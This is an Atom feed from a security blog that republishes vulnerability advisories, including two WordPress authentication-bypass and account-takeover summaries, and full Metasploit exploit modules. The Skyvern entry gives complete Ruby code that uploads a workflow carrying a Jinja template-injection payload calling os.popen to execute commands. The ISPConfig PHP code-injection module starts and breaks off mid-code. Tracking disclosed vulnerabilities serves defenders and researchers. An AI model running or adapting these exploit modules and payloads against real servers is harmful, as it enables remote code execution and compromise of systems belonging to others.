<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>liancc&#39; infos blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-06-27T10:00:08.887Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>lianccc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>The Simple Payment plugin for WordPress is vulnerable to Authentication Bypass in versions 136</title>
    <link href="http://example.com/2025/06/27/github_2201132127/"/>
    <id>http://example.com/2025/06/27/github_2201132127/</id>
    <published>2025-06-27T10:00:08.888Z</published>
    <updated>2025-06-27T10:00:08.887Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-x3mp-x433-h32f">https://github.com/advisories/GHSA-x3mp-x433-h32f</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6688">https://nvd.nist.gov/vuln/detail/CVE-2025-6688</a></p></li><li><p><a href="https://plugins.trac.wordpress.org/changeset/3318371/simple-payment/tags/2.3.9/simple-payment-plugin.php">https://plugins.trac.wordpress.org/changeset/3318371/simple-payment/tags/2.3.9/simple-payment-plugin.php</a></p></li><li><p><a href="https://www.wordfence.com/threat-intel/vulnerabilities/id/8b4e2f87-e3ad-4f1b-b647-f5e5a49f691b?source=cve">https://www.wordfence.com/threat-intel/vulnerabilities/id/8b4e2f87-e3ad-4f1b-b647-f5e5a49f691b?source=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-x3mp-x433-h32f">https://github.com/advisories/GHSA-x3mp-x433-h32f</a></p></li></ul><p><strong>描述：</strong></p><p>The Simple Payment plugin for WordPress is vulnerable to Authentication Bypass in versions 1.3.6 to 2.3.8. This is due to the plugin not properly verifying a user’s identity prior to logging them in through the create_user() function. This makes it possible for unauthenticated attackers to log in as administrative users.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-x3mp-x433-h32f&quot;&gt;https://github.com/advisories/GHSA-x3mp-x433-h32f&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>The DWT - Directory &amp; Listing WordPress Theme theme for WordPress is vulnerable to privilege</title>
    <link href="http://example.com/2025/06/27/github_1294300802/"/>
    <id>http://example.com/2025/06/27/github_1294300802/</id>
    <published>2025-06-27T10:00:05.144Z</published>
    <updated>2025-06-27T10:00:05.143Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-r95m-rm59-p2hp">https://github.com/advisories/GHSA-r95m-rm59-p2hp</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12827">https://nvd.nist.gov/vuln/detail/CVE-2024-12827</a></p></li><li><p><a href="https://themeforest.net/item/dwt-listing-directory-listing-wordpress-theme/21976132">https://themeforest.net/item/dwt-listing-directory-listing-wordpress-theme/21976132</a></p></li><li><p><a href="https://www.wordfence.com/threat-intel/vulnerabilities/id/51fc7d47-2a0f-4713-9859-120321aa32dc?source=cve">https://www.wordfence.com/threat-intel/vulnerabilities/id/51fc7d47-2a0f-4713-9859-120321aa32dc?source=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-r95m-rm59-p2hp">https://github.com/advisories/GHSA-r95m-rm59-p2hp</a></p></li></ul><p><strong>描述：</strong></p><p>The DWT - Directory &amp; Listing WordPress Theme theme for WordPress is vulnerable to privilege escalation via account takeover in all versions up to, and including, 3.3.6. This is due to the plugin not properly checking for an empty token value prior to resetting a user’s password through the dwt_listing_reset_password() function. This makes it possible for unauthenticated attackers to change arbitrary user’s passwords, including administrators, and leverage that to gain access to their account.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-r95m-rm59-p2hp&quot;&gt;https://github.com/advisories/GHSA-r95m-rm59-p2hp&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>Skyvern SSTI Remote Code Execution</title>
    <link href="http://example.com/2025/06/27/github_2122402481/"/>
    <id>http://example.com/2025/06/27/github_2122402481/</id>
    <published>2025-06-27T09:45:14.216Z</published>
    <updated>2025-06-27T09:45:14.214Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Skyvern SSTI Remote Code Execution</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> 2025-49619</li></ul><p><strong>漏洞类型：</strong> 服务端模板注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Skyvern存在服务端模板注入漏洞，攻击者可以利用此漏洞在受影响版本&lt;&#x3D;0.1.84的Skyvern上执行远程代码。该模块需要API密钥来发送请求并上传恶意工作流。</p><p><strong>产品厂商：</strong> Skyvern</p><p><strong>产品名称：</strong> Skyvern</p><p><strong>影响版本：</strong> &lt;&#x3D;0.1.84</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/ee890a83ca22a04558273e9724e17c6bfec02a61/modules%2Fexploits%2Flinux%2Fhttp%2Fskyvern_ssti_cve_2025_49619.rb">https://github.com/rapid7/metasploit-framework/blob/ee890a83ca22a04558273e9724e17c6bfec02a61/modules%2Fexploits%2Flinux%2Fhttp%2Fskyvern_ssti_cve_2025_49619.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">ExcellentRanking</span><br><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::Remote::HttpClient</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Skyvern SSTI Remote Code Execution&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">          This module exploits SSTI vulnerability in Skyvern&lt;=0.1.84. The module requires API key to deliver requests and upload malicious workflow.</span><br><span class="hljs-string">        &#125;</span>,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;Cristian Branet&#x27;</span>, <span class="hljs-comment"># researcher</span><br>          <span class="hljs-string">&#x27;msutovsky-r7&#x27;</span> <span class="hljs-comment"># module dev</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [ <span class="hljs-string">&#x27;EDB&#x27;</span>, <span class="hljs-string">&#x27;52335&#x27;</span> ],<br>          [ <span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://cristibtz.blog/posts/CVE-2025-49619/&#x27;</span>],<br>          [ <span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-49619&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">%w[linux]</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_CMD</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Linux Target&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">%w[linux]</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_CMD</span><br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Payload&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;BadChars&#x27;</span> =&gt; <span class="hljs-string">%(&quot;)</span> &#125;,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-06-07&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">IOC_IN_LOGS</span>]<br>        &#125;<br>      )<br>    )<br>    register_options([<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;API_KEY&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;API key for Skyvern&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>])<br>    ])<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_workflow_json</span><br>    &#123;<br>      <span class="hljs-symbol">title:</span> <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alphanumeric(<span class="hljs-number">8</span>),<br>      <span class="hljs-symbol">description:</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>      <span class="hljs-symbol">proxy_location:</span> <span class="hljs-string">&#x27;RESIDENTIAL&#x27;</span>,<br>      <span class="hljs-symbol">webhook_callback_url:</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>      <span class="hljs-symbol">persist_browser_session:</span> <span class="hljs-literal">false</span>,<br>      <span class="hljs-symbol">model:</span> <span class="hljs-literal">nil</span>,<br>      <span class="hljs-symbol">totp_verification_url:</span> <span class="hljs-literal">nil</span>,<br>      <span class="hljs-symbol">workflow_definition:</span> &#123;<br>        <span class="hljs-symbol">parameters:</span> [],<br>        <span class="hljs-symbol">blocks:</span> [<br>          &#123;<br>            <span class="hljs-symbol">label:</span> <span class="hljs-string">&#x27;block_1&#x27;</span>,<br>            <span class="hljs-symbol">continue_on_failure:</span> <span class="hljs-literal">false</span>,<br>            <span class="hljs-symbol">block_type:</span> <span class="hljs-string">&#x27;task_v2&#x27;</span>,<br>            <span class="hljs-symbol">prompt:</span> <span class="hljs-string">%&lt;&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;\n  &#123;% if &#x27;warning&#x27; in x.__name__ %&#125;\n    &#123;&#123; x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&quot;<span class="hljs-subst">#&#123;payload.encoded&#125;</span>&quot;).read() &#125;&#125;\n  &#123;% endif %&#125;\n&#123;% endfor %&#125;&gt;</span>,<br>            <span class="hljs-symbol">url:</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-symbol">max_steps:</span> <span class="hljs-number">25</span>,<br>            <span class="hljs-symbol">totp_identifier:</span> <span class="hljs-literal">nil</span>,<br>            <span class="hljs-symbol">totp_verification_url:</span> <span class="hljs-literal">nil</span><br>          &#125;<br>        ]<br>      &#125;,<br>      <span class="hljs-symbol">is_saved_task:</span> <span class="hljs-literal">false</span><br>    &#125;<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_workflow</span><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(<span class="hljs-string">&#x27;/api/v1/workflows&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;X-API-Key&#x27;</span>: datastore[<span class="hljs-string">&#x27;API_KEY&#x27;</span>] &#125;,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>      <span class="hljs-string">&#x27;data&#x27;</span> =&gt; create_workflow_json.to_json<br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Received unexpected response&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    res_json = res.get_json_document<br><br>    <span class="hljs-variable">@workflow_id</span> = res_json.fetch(<span class="hljs-string">&#x27;workflow_permanent_id&#x27;</span>, <span class="hljs-literal">nil</span>)<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unknown</span>, <span class="hljs-string">&#x27;Failed to upload workflow&#x27;</span>) <span class="hljs-keyword">unless</span> <span class="hljs-variable">@workflow_id</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">trigger_workflow</span><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(<span class="hljs-string">&#x27;/api/v1/workflows/&#x27;</span>, <span class="hljs-variable">@workflow_id</span>, <span class="hljs-string">&#x27;/run&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;X-API-Key&#x27;</span>: datastore[<span class="hljs-string">&#x27;API_KEY&#x27;</span>] &#125;,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>      <span class="hljs-string">&#x27;data&#x27;</span> =&gt; &#123; <span class="hljs-symbol">workflow_id:</span> <span class="hljs-variable">@workflow_id</span> &#125;.to_json<br>    &#125;)<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Received unexpected response&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    res_json = res.get_json_document<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unknown</span>, <span class="hljs-string">&#x27;Failed to upload workflow&#x27;</span>) <span class="hljs-keyword">unless</span> res_json.fetch(<span class="hljs-string">&#x27;workflow_id&#x27;</span>, <span class="hljs-literal">nil</span>) |<span class="hljs-params"></span>| res_json.fetch(<span class="hljs-string">&#x27;workflow_run_id&#x27;</span>, <span class="hljs-literal">nil</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(<span class="hljs-string">&#x27;/api/v1/workflows&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;X-API-Key&#x27;</span>: datastore[<span class="hljs-string">&#x27;API_KEY&#x27;</span>] &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span>(<span class="hljs-string">&#x27;Target is probably not Skyvern&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    res_json = res.get_json_document<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unknown</span>(<span class="hljs-string">&#x27;Failed to get additional information - target is either not Skyvern or you used incorrect API key&#x27;</span>) <span class="hljs-keyword">unless</span> res_json<br><br>    <span class="hljs-title class_">Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Detected</span>(<span class="hljs-string">&#x27;Target is Skyvern&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    create_workflow<br>    trigger_workflow<br>  <span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Skyvern SSTI Remote Code Execution&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="服务端模板注入" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ISPConfig language_editphp PHP代码注入漏洞</title>
    <link href="http://example.com/2025/06/27/github_457305466/"/>
    <id>http://example.com/2025/06/27/github_457305466/</id>
    <published>2025-06-27T07:15:15.145Z</published>
    <updated>2025-06-27T07:15:15.143Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> 2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 在ISPConfig 3.2.11p1之前的版本中，发现了一个问题。如果admin_allow_langedit被启用，管理员可以通过语言文件编辑器实现PHP代码注入。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/016f4ea14207f629f77d100747034c7319924f03/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb">https://github.com/rapid7/metasploit-framework/blob/016f4ea14207f629f77d100747034c7319924f03/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  prepend Msf::Exploit::Remote::AutoCheck<br>  include Msf::Exploit::Remote::HttpClient<br>  include Msf::Exploit::FileDropper<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;ISPConfig language_edit.php PHP Code Injection&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          An issue was discovered <span class="hljs-keyword">in</span> ISPConfig before <span class="hljs-number">3.2</span>.<span class="hljs-number">11p</span>1. PHP code injection can be achieved <span class="hljs-keyword">in</span> the language file editor <span class="hljs-keyword">by</span> an admin <span class="hljs-keyword">if</span> admin_allow_langedit <span class="hljs-keyword">is</span> enabled.<br>        &#125;,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;syfi&#x27;</span> <span class="hljs-comment"># Discovery and PoC</span><br>        ],<br>        <span 